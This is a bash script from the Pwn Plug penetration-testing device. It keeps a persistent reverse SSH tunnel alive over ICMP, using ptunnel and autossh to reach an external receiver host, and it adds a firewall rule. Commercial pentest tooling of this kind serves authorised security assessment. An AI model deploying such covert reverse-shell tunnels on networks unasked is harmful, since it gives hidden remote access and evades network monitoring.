#!/bin/bash
# Copyright 2010-2015 Rapid Focus Security, LLC
# pwnieexpress.com
#
# This script contains proprietary software distributed under the terms of the Rapid Focus Security, LLC End User License Agreement (EULA).
#
# Use of this software signifies your agreement to the Rapid Focus Security, LLC End User License Agreement (EULA).
#
# Rapid Focus Security, LLC EULA: http://pwnieexpress.com/pdfs/RFSEULA.pdf
#
# Revision: 4.26.2012

# Get user variables from script_configs
# ptunnel_proxy=
# SSH_receiver=
. /var/pwnplug/script_configs/reverse_ssh_over_ICMP_config.sh

# Set SSH variables
SSH_listener_port=3339
SSH_user=pwnplug
SSH_key="/root/.ssh/id_rsa"
Tunnel_status=`ps -C ssh -o pid,args |grep -o "${SSH_listener_port}:localhost:22"`
AUTOSSH_PID=`ps -C autossh -o pid,args |grep "autossh -2NR ${SSH_listener_port}" |awk '{print$1}'`
SSH_ChildProcess_PID=`ps -C ssh -o pid,args |grep "${SSH_listener_port}:localhost:22" |awk '{print$1}'`
iptables_rule_status=`iptables -nvL |grep -o "tcp dpt:7776" |tail -n1`

# Set standard autossh variables
export AUTOSSH_FIRST_POLL=60
export AUTOSSH_POLL=60
export AUTOSSH_GATETIME=30
export AUTOSSH_LOGFILE=/var/log/autossh.log
export AUTOSSH_DEBUG=no
export AUTOSSH_PATH=/usr/bin/ssh

# Set tunnel-specific autossh variables
export AUTOSSH_PORT=22090
export AUTOSSH_PIDFILE=/var/run/ICMP_autossh.pid

# Add iptables rule if not present
if [ "${iptables_rule_status}" == "tcp dpt:7776" ] ; then echo "iptables rule present" ; \
else iptables -A INPUT -i eth0 -p tcp --dport 7776 -j DROP
fi

# If tunnel already established, do nothing. If not, attempt connect.
if [ "${Tunnel_status}" == "${SSH_listener_port}:localhost:22" ] ; then echo connected ; \
else \
kill ${AUTOSSH_PID}; \
kill ${SSH_ChildProcess_PID}; \
killall ptunnel ; \
sleep 1

ptunnel -lp 7776 -p "$SSH_receiver" -da "$SSH_receiver" -dp 22 -c eth0 & \
sleep 1
autossh -2NR ${SSH_listener_port}:localhost:22 -i "$SSH_key" "$SSH_user"@localhost -p 7776 ; \
fi
